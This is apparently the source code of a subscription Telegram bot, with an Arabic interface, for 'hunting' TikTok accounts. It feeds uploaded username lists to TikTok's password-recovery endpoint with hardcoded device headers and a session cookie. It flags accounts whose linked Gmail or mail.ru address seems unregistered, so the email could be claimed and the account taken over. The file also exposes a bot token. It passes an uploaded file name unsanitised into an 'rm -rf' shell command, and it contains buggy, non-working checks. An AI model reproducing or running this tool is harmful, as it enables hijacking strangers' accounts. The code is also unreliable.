import telebot
from telebot import types
import requests
from time import sleep
import datetime
import user_agent
from user_agent import *
import uuid
from uuid import *
import secrets
import os
import json

token = '6355330559:AAHUz7qybCoNbYYVGD33berARejITJoWQbY'
bot = telebot.TeleBot(token)

@bot.message_handler(commands=['read'])
def read_filee(ree):
	with open('users.txt', "r") as re:
		re.read()
		re.readline()
		re.readlines()
	with open('sh.txt', "r") as er:
		er.read()
		er.readline()
		er.readlines()
	bot.send_message(ree.chat.id,text='''
<strong>
[🎭] تم قرائه الملفات يدوي .
</strong>
''',parse_mode='html')
@bot.message_handler(commands=['list','l'])
def list(li):
	idl = li.from_user.id
	if idl == 5996358981:
		us = open('users.txt', "r").readlines()
		uss = len(us)
		sh = open('sh.txt', "r").readlines()
		shh = len(sh)
		bot.send_message(li.chat.id,text=f'''
الاعضاء : {uss}
المشتركين : {shh}
		''')
	else: pass
@bot.message_handler(commands=['commands'])
def comm(co):
	website_link = 'https://t.me/mmaahg'
	name = co.from_user.full_name
	bot.send_message(co.chat.id,text=f'''
<strong>
اهلا بك {name} ،

اوامر بوت متاحاتكم 🤖

[🎭] /start - لبدء التشغيل

[🎭] /id or ID - لجلب الايدي

[🎭] /info or /photo - لجلب معلوماتك بالكامل

[🎭] /admin - لعرض لوحه المطور

[🎭] /read - في حال حدوث خطا يتم قرائه الملفات يدوي

[🎭] /commands - لعرض الاوامر

<a href='{website_link}'>المطور 👨‍💻</a>
</strong>
	''', parse_mode='html')
	
@bot.message_handler(commands=['admin','a'])
def admin(a):
	id1 = a.from_user.id
	if id1 == 5996358981:
		a1 = types.InlineKeyboardButton('تفعيل اشتراك', callback_data='a1')
		a2 = types.InlineKeyboardButton('الغاء تفعيل اشتراك',callback_data='a2')
		a3 = types.InlineKeyboardButton('الاحصائيات',callback_data='a3')
		a4 = types.InlineKeyboardButton('اذاعه',callback_data='a4')
		mara = types.InlineKeyboardMarkup(row_width=2)
		mara.add(a2,a1,a3,a4)
		bot.send_message(a.chat.id,text=f'<strong>اهلا مطوري 👨‍💻</strong>',parse_mode='html', reply_markup=mara)
	else:
		bot.send_message(a.chat.id,text='<strong>كل قوتك؟</strong>',parse_mode='html')
	
@bot.message_handler(commands=['id', 'Id', 'iD', 'ID'])

def owbe(mo):
	ig = mo.from_user.id
	bot.send_message(mo.chat.id,text=f'''<strong>
❖ - Your Id 🎭

|⌯| Id ⌯ </strong><code>{ig}</code>
<strong><s> محمد ال سيد </s></strong>
''', parse_mode='html')

@bot.message_handler(commands=['info', 'photo'])

def send_user_info(message):
    
    user = message.chat
    
    user_info = bot.get_chat(user.id)
    
    first_name = user.first_name 
    
    last_name = message.from_user.full_name
    
    username = user.username 
    
    user_idnc = user.id
    
    bio = user_info.bio
    
    photos = bot.get_user_profile_photos(user_idnc).photos
    
    photo_file_id = None
    
    if photos:
        
        photo_file_id = photos[0][-1].file_id
    
    dev = types.InlineKeyboardButton('pro 👨‍💻', url='t.me/mmaahg')
    
    bb = types.InlineKeyboardMarkup(row_width=1);bb.add(dev)
    
    bot.send_photo(chat_id=message.chat.id, photo=photo_file_id, caption=f'''<strong>
❖ - Your Info 🎭

[⌯] Name ⌯ </strong>{last_name}
<strong>[⌯] User ⌯ </strong>@{username}
<strong>[⌯] Id ⌯ <code>{user_idnc}</code>
[⌯] Bio ⌯ </strong>{bio}
    ''', parse_mode='html', reply_markup=bb)
@bot.message_handler(commands=['start','s','dergham','dxiim'])
def start(message):
	ask = open('sh.txt', "r").read()
	id_sh = message.from_user.id
	ase = open('users.txt', "r").read()
	if str(id_sh) in ase:
		pass
	else:
		with open('users.txt', "a") as df:
			df.write(f'{id_sh}\n')
			
	if str(id_sh) not in ask:
		ks = types.InlineKeyboardButton('الاسعار 🎭', callback_data='ks')
		maks = types.InlineKeyboardMarkup()
		maks.add(ks)
		web = 'https://t.me/mmaahg'
		return bot.send_message(message.chat.id,text=f'''
عذرا عزيزي ⛔
هذه البوت باشتراك راسل المطور لتفعيل الاشتراك

<a href='{web}'>المطور 👨‍💻</a>
		''', parse_mode='html', reply_markup=maks)
	else:
		pass
	s1 = types.InlineKeyboardButton('🎭 gmail 🎭', callback_data='s1')
	s2 = types.InlineKeyboardButton('🎭 mail.ru 🎭', callback_data='s2')
	ss = types.InlineKeyboardMarkup()
	ss.add(s1,s2)
	bot.send_message(message.chat.id,text=f'''
<strong>
مرحبا !

البوت مخصص لصيد حسابات تيك توك

اخِتر الدومين ثم ارسل لسته من فضلك✨
</strong>
	''',parse_mode='html', reply_markup=ss)

@bot.callback_query_handler(func=lambda call:True)

def call1(call):
	if call.data == 'ks':
		dev = types.InlineKeyboardButton('المطور 🎭', url='t.me/mmaahg')
		ch = types.InlineKeyboardButton('🎭', url='t.me/tttttutttt')
		ch1 = types.InlineKeyboardButton('🎭', url='t.me/tttttutttt')
		chh = types.InlineKeyboardMarkup()
		chh.add(dev)
		chh.add(ch,ch1)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''
❖ - اسعار الاشتراك 🎭
<strong>
رصيد $
	اسبوعي 5$
	اسبوعين 10$
	شهري 15$

نقاط °
	اسبوعي 15.000
	اسبوعين 30.000
	شهري 45.000
</strong>
تفعيل يومي بـ مقابل 👨‍💻

للاشتراك راسل المطور 👇
		''',parse_mode='html',reply_markup=chh)
	elif call.data == 's1':
		ss1 = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='''<strong>
❖ - ارسل الملف ليتم الفحص ✨
<s>النوع gmail.com</s>
</strong>
		''',parse_mode='html')
		bot.register_next_step_handler(ss1,s1s)
	elif call.data == 's2':
		ss2 = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='''<strong>
❖ - ارسل الملف ليتم الفحص ✨
<s>النوع mail.ru</s>
</strong>
		''',parse_mode='html')
		bot.register_next_step_handler(ss2,s2s)
	elif call.data == 'a1':
		aa1 = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لتفعيل اشتراك 🎭
</strong>
		''',parse_mode='html')
		bot.register_next_step_handler(aa1, a1a)
	elif call.data == 'a2':
		aa2 = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لالغاء تفعيل اشتراك 🎭
</strong>
		''',parse_mode='html')
		bot.register_next_step_handler(aa2, a2a)
	elif call.data == 'kd':
		a1 = types.InlineKeyboardButton('تفعيل اشتراك', callback_data='a1')
		a2 = types.InlineKeyboardButton('الغاء تفعيل اشتراك',callback_data='a2')
		a3 = types.InlineKeyboardButton('الاحصائيات',callback_data='a3')
		a4 = types.InlineKeyboardButton('اذاعه',callback_data='a4')
		mara = types.InlineKeyboardMarkup(row_width=2)
		mara.add(a2,a1,a3,a4)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'<strong>اهلا مطوري 👨‍💻</strong>',parse_mode='html', reply_markup=mara)
	elif call.data == 'a4':
		siu = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - الان ارسل الكليشه 🎭

<s>فقط كلام بدون صور او الخ...</s>
		</strong>''',parse_mode='html')
		bot.register_next_step_handler(siu, se)
	elif call.data == 'shlen':
		ghk = open('sh.txt', "r").read()
		back = types.InlineKeyboardButton('رجوع 🎭', callback_data='back')
		mab = types.InlineKeyboardMarkup();mab.add(back)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
ءلو
❖ - قائمه المشتركين 🎭

{ghk}
		</strong>''',parse_mode='html', reply_markup=mab)
	elif call.data == 'back':
		kd = types.InlineKeyboardButton('رجوع 🎭',callback_data='kd')
		shlen = types.InlineKeyboardButton('المشتركين', callback_data='shlen')
		mark = types.InlineKeyboardMarkup(row_width=2)
		mark.add(shlen,adlen,kd)
		with open('sh.txt', "r") as fk:
			ll = fk.readlines()
			o = len(ll)
		with open('users.txt', "r") as y:
			kk = y.readlines()
			oo = len(kk)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
بايثون عم سابو

❖ - الاحصائيات 🎭

المستخدمين : {oo}
المشتركين : {o}
		</strong>''',parse_mode='html', reply_markup=mark)
	elif call.data == 'a3':
		kd = types.InlineKeyboardButton('رجوع 🎭',callback_data='kd')
		shlen = types.InlineKeyboardButton('المشتركين', callback_data='shlen')
		mark = types.InlineKeyboardMarkup(row_width=2)
		mark.add(shlen,kd)
		with open('sh.txt', "r") as fk:
			ll = fk.readlines()
			o = len(ll)
		with open('users.txt', "r") as y:
			kk = y.readlines()
			oo = len(kk)
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
بايثون عم سابو

❖ - الاحصائيات 🎭

المستخدمين : {oo}
المشتركين : {o}
		</strong>''',parse_mode='html', reply_markup=mark)
def a2a(ol):
	try:
		user_id = int(ol.text)
	except:
		bot.send_message(ol.chat.id,text='ارسل ايدي صالح ')
	ad = open('users.txt', "r").read()
	if str(user_id) not in ad:
		bot.send_message(ol.chat.id,text='<strong>هذه العضو غير موجود داخل البوت !</strong>',parse_mode='html')
		return
	else:
		pass
	filename = 'sh.txt'
	
	with open(filename, 'r') as f:
		
		lines = f.readlines()
	
	with open(filename, 'w') as f:
		
		for line in lines:
		   		
		   		if str(user_id) in line:
		   			
		   			continue
		   			
		   		f.write(line)
		   		bot.send_message(ol.chat.id,text=f'''<strong>
تم الغاء تفعيل اشتراك العضو : {user_id}
</strong>
	''', parse_mode='html')
	
	try:
		
		vw = requests.post(f"""https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text=
لقد انتهى تفعيل الاشتراك 🎭""")

	except:
		
		return bot.send_message(ol.chat.id,text='خطا في إرسال للعضو')


def se(es):
	done =0
	bbad =0
	alli =0
	with open('users.txt', "r") as g:
		ok = len(g.readlines())
	try:
		mess = es.text
	except:
		return bot.send_message(es.chat.id,text='ارسل نص فقط !')
	mssg = bot.send_message(es.chat.id,text='''
<strong>
جارٍ التحضير...
</strong>
		''',parse_mode='html')
	seen = open('users.txt', "r")
	while True:
		sen = seen.readline().split('\n')[0]
		try:
			done +=1
			alli +=1
			vw = requests.post(f"""https://api.telegram.org/bot{token}/sendMessage?chat_id={sen}&text={mess}""")
		except:
			bbad +=1
			alli +=1
		d1 = types.InlineKeyboardButton(f'Done : {done}', callback_data='d1')
		d2 = types.InlineKeyboardButton(f'Bad : {bbad}', callback_data='d2')
		d0 = types.InlineKeyboardButton(f'{ok} / {alli}')
		d3 = types.InlineKeyboardMarkup()
		d3.add(d2,d1)
		bot.edit_message_text(chat_id=es.chat.id,message_id=mssg.message_id,text=f'''<strong>
❖ - جارٍ الارسال ...
</strong>
   ''',parse_mode='html', reply_markup=d3)
		if sen == '':
			with open('users.txt', "r") as ed:
				allu = len(ed.readlines())
			bot.send_message(es.chat.id,text=f'''
❖ - تم بنجاح ارسال إذاعة

عدد الاعضاء : {allu}
تم بنجاح ارسال الى : {done}
عدد الذين قامو بحظر البوت : {bbad}
			''')
			break

		
def a1a(iw):
	try:
		idnv = iw.text
	except:
		return bot.send_message(iw.chat.id,text='ارسل ايدي صالح')
	wi = open('users.txt', "r").read()
	if idnv not in wi:
		return bot.send_message(iw.chat.id,text='<strong>هذه العضو غير موجود !!!</strong>',parse_mode='html')
	else: pass
	with open('sh.txt', "a") as lje:
		lje.write(f'{idnv}\n')
	bot.send_message(iw.chat.id,text='''<strong>
تم تفعيل الاشتراك بنجاح
</strong>
	''', parse_mode='html')
	try:
		kg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={idnv}&text=تم تفعيل الاشتراك بنجاح 🎭")
	except:
		bot.send_message(iw.chat.id,text='🎭')
def s1s(gm):
	hit =0
	bad =0
	error =0
	good =0
	all= -1
	try:
		filename = gm.document.file_name
		fil = bot.get_file(gm.document.file_id)
		dow = bot.download_file(fil.file_path)
		with open(filename, 'wb') as f0:
			f0.write(dow)
			p_file = open(filename, "r")
			mssg=bot.send_message(gm.chat.id,text="wait a letile ...")
	except:
		bot.send_message(gm.chat.id,text='''<strong>
عذرا لا يمكنني التعرف علي الشيء الذي ارسلته
الرجاء ارسال ملف صالح
</strong>
  ''',parse_mode='html')
		return
	with open(filename, "r") as f4:
		all_line = f4.readlines()
		allline = len(all_line)
	while True:
		s = p_file.readline().split('\n')[0]
		try:
			emai = s.split('@')[0]
			sss = s.split('@')[0]
			email = emai + '@gmail.com'
		except:
			email = s + '@gmail.com'
			sss = s
		url = f'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
		headers = {
'Host': 'api2-19-h2.musical.ly',
'Connection': 'keep-alive',
'Content-Length': '647',
'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
'Accept-Encoding': 'gzip',
'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
'sdk-version': '1',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-SS-TC': '0',
'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'}
		data = (f'app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')
		rr = requests.post(url, headers=headers, data=data).text
		
		if 'Sent successfully' in rr or "Sorry, you sent email too often, please retry in 3 minutes later." in rr:
			good +=1
			all +=1
			a =0
			v =0
			# دور اتصال جيميل؟😂😂
			if a ==v:
				hit +=1
				bot.send_message(gm.chat.id,text=f'''
hit : {hit}
email : {email}	
				''')
				all+=1
			else:
				error +=1
				all +=1
			
		elif 'دور رسبونس😂😂؟' in rr:
			bad +=1
			all +=1
		else:
			error +=1
			all +=1
		n1 = types.InlineKeyboardButton(f'HIT 🎭 {hit}',callback_data='n1')
		n2 = types.InlineKeyboardButton(f'Bad : {bad}', callback_data='n2')
		n3 = types.InlineKeyboardButton(f'Good : {good}', callback_data='n3')
		n4 = types.InlineKeyboardButton(f'Error : {error}', callback_data='n4')
		n5 = types.InlineKeyboardButton(f'{email}', callback_data='n5')
		n6 = types.InlineKeyboardButton(f'{filename} | {allline} / {all}', callback_data='n6')
		n0 = types.InlineKeyboardMarkup()
		n0.add(n1)
		n0.add(n2,n3,n4)
		n0.add(n6)
		n0.add(n5)
		bot.edit_message_text(chat_id=gm.chat.id,message_id=mssg.message_id,text=f'''<strong>
بدء الصيد حظاً موفقاً...🖤
<s>النوع : gmail.com</s>
</strong>
   ''',parse_mode='html', reply_markup=n0)
		if email.strip() == '@gmail.com':
			bot.send_message(gm.chat.id,text=f'''
تم انتهاء الفحص بنجاح 🎭

عدد المتاحات : {hit}
عدد اللسته : {allline}
			''')
			try:
				os.system(f'rm -rf {filename}')
			except:
				os.system(f'rm -rf {filename}')
			break
def s2s(gm):
	hit =0
	bad =0
	error =0
	good =0
	all= -1
	try:
		filename = gm.document.file_name
		fil = bot.get_file(gm.document.file_id)
		dow = bot.download_file(fil.file_path)
		with open(filename, 'wb') as f0:
			f0.write(dow)
			p_file = open(filename, "r")
			mssg=bot.send_message(gm.chat.id,text="wait a letile ...")
	except:
		bot.send_message(gm.chat.id,text='''<strong>
عذرا لا يمكنني التعرف علي الشيء الذي ارسلته
الرجاء ارسال ملف صالح
</strong>
  ''',parse_mode='html')
		return
	with open(filename, "r") as f4:
		all_line = f4.readlines()
		allline = len(all_line)
	while True:
		s = p_file.readline().split('\n')[0]
		try:
			emai = s.split('@')[0]
			sss = s.split('@')[0]
			email = emai + '@mail.ru'
			gmm = emai + '@gmail.com'
		except:
			email = s + '@mail.ru'
			gmm = s + '@gmail.com'
			sss = s
		url = f'https://api2-19-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=ar&manifest_version_code=2018101933&_rticket=1667149902064&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233&ts=1667149902&as=a1261b755ea4d3e04e4388&cp=be4a3c6ce5e8520fe1MkUo&mas=0149d8edb9a3340aacd5c82fcadadde3801c1ccc2ca62c0ca6cc26'
		headers = {
'Host': 'api2-19-h2.musical.ly',
'Connection': 'keep-alive',
'Content-Length': '647',
'Cookie': 'odin_tt=b0db11ac4955afa4589bdb09d8f8fdcf3bcdea5238d0a6e2ba7c6aaea542e8d4ff9a3f324c153df80e03ac5e29a9d411925fa05d2f300713a2295db1eeff68accf50d5ddb5abd11115077fe989cfc094; store-idc=maliva; store-country-code=iq; store-country-code-src=did',
'Accept-Encoding': 'gzip',
'X-SS-QUERIES': 'dGMCAr6ot3awALq2qSjedy1Vk99nIoud%2BAhHSPAsj5dyUWFbxRx0wm95EoKwwNB3VVlOMd4SzMIENA51cwBS%2Bm0N1T95yguPVZ4OunAWAs0t0bHbsPclnVdl1Uh%2BLGZVXFGTew%3D%3D',
'sdk-version': '1',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-SS-TC': '0',
'User-Agent': 'com.zhiliaoapp.musically/2018101933 (Linux; U; Android 11; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/58.0.2991.0)'}
		data = (f'app_language=ar&manifest_version_code=2018101933&_rticket=1667150564079&iid=7160349471136909061&channel=googleplay&language=ar&fp=&device_type=ANY-LX2&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2018101933&sys_region=IQ&os_api=30&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&email={email}&retry_type=no_retry&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&mcc_mnc=41805&timezone_offset=10800&os_version=11&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HONOR&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=SA&aid=1233')
		rr = requests.post(url, headers=headers, data=data).text
		print(rr)
		if 'Sent successfully' in rr or "Sorry, you sent email too often, please retry in 3 minutes later." in rr:
			good +=1
			all +=1
			url5 = 'https://account.mail.ru/api/v1/user/exists'
			headers5 = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
    }
			emaill = email.split('@')[0] + '@mail.ru'
			data5 = {
'email': str(emaill)
    }
			
			response = requests.post(url,headers=headers,data=data).text
			if 'exists":false' in response:
				hit +=1
				bot.send_message(gm.chat.id,text=f'''
hit : {hit}
email : {email}	
				''')
				all+=1
			else:
				error +=1
				all +=1
			
		elif 'Bind device by email failed' in rr:
			bad +=1
			all +=1
		else:
			error +=1
			all +=1
		n1 = types.InlineKeyboardButton(f'HIT 🎭 {hit}',callback_data='n1')
		n2 = types.InlineKeyboardButton(f'Bad : {bad}', callback_data='n2')
		n3 = types.InlineKeyboardButton(f'Good : {good}', callback_data='n3')
		n4 = types.InlineKeyboardButton(f'Error : {error}', callback_data='n4')
		n5 = types.InlineKeyboardButton(f'{email}', callback_data='n5')
		n6 = types.InlineKeyboardButton(f'{filename} | {allline} / {all}', callback_data='n6')
		n0 = types.InlineKeyboardMarkup()
		n0.add(n1)
		n0.add(n2,n3,n4)
		n0.add(n6)
		n0.add(n5)
		bot.edit_message_text(chat_id=gm.chat.id,message_id=mssg.message_id,text=f'''<strong>
بدء الصيد حظاً موفقاً...🖤
<s>النوع : mail.ru</s>
</strong>
   ''',parse_mode='html', reply_markup=n0)
		if email.strip() == '@mail.ru':
			bot.send_message(gm.chat.id,text=f'''
تم انتهاء الفحص بنجاح 🎭

عدد المتاحات : {hit}
عدد اللسته : {allline}
			''')
			try:
				os.system(f'rm -rf {filename}')
			except:
				os.system(f'rm -rf {filename}')
			break
   
def deer():
	try:
		bot.polling(none_stop=True)
	except:
		deer()
	deee()
deer()